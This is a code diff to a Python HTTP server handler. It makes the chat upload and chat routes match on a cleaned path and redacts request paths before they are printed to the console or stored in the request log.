@@ -4051,7 +4446,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             self.send_header("Content-Length", str(len(result)))
             self.end_headers()
             self.wfile.write(result)
-        elif self.path == '/chat/upload':
+        elif path == '/chat/upload':
             fields = {}
             saved = parse_multipart(body, self.headers.get('Content-Type', ''), fields)
             attachments = [attachment_info(name) for name in saved]
@@ -4059,7 +4454,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 self._send(200, json.dumps({'ok': True, 'files': attachments}))
             else:
                 self._send(400, '{"error":"No message or attachments received"}')
-        elif self.path == '/chat':
+        elif path == '/chat':
             if body:
                 message = body.decode('utf-8', errors='replace').strip()
                 if _append_chat(message):
@@ -4120,6 +4515,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         now = datetime.datetime.now().strftime("%H:%M:%S")
         client_ip = self.real_ip()
         client_port = self.client_address[1]
+        display_path = redact_path(self.path or '')
         show = unique_hit(client_ip, self.command or "-", path, code)
 
         if show:
@@ -4132,7 +4528,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
                 SEP = f"  {DM}│{W}"
                 lines = []
                 lines.append(f"\n  {DM}┌─ #{request_number} ─────────────────────────────────────────────{W}")
-                lines.append(f"{SEP} {DM}{now}{W}  {BD}{self.command or '-'} {CY}{self.path or '-'}{W}  {cc}{code}{W}  {DM}{self.request_version}{W}")
+                lines.append(f"{SEP} {DM}{now}{W}  {BD}{self.command or '-'} {CY}{display_path}{W}  {cc}{code}{W}  {DM}{self.request_version}{W}")
                 client_str = f"{client_ip}:{client_port}"
                 if client_ip != self.client_address[0]:
                     client_str += f"  {DM}(via {self.client_address[0]}){W}"
@@ -4173,7 +4569,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
             else:
                 browser, os_name = parse_ua(ua)
                 label = " ".join(part for part in (browser, os_name) if part and part != "-")
-                event("HTTP", f"{self.command or '-'} {self.path or '-'} {code}"
+                event("HTTP", f"{self.command or '-'} {display_path or '-'} {code}"
                               + (f" · {label}" if label else ""), client_ip)
             sys.stderr.flush()
 
@@ -4182,7 +4578,7 @@ class Handler(http.server.SimpleHTTPRequestHandler):
         _path_clean = (self.path or '').split('?')[0]
         if _path_clean not in _skip:
             entry = {"n": request_number, "ts": time.time(), "time": now,
-                     "method": self.command or "-", "path": self.path or "-",
+                     "method": self.command or "-", "path": display_path or "-",
                      "httpver": self.request_version or "-",
                      "ip": client_ip, "peer": self.client_address[0],
                      "port": client_port, "code": code, "ua": ua}
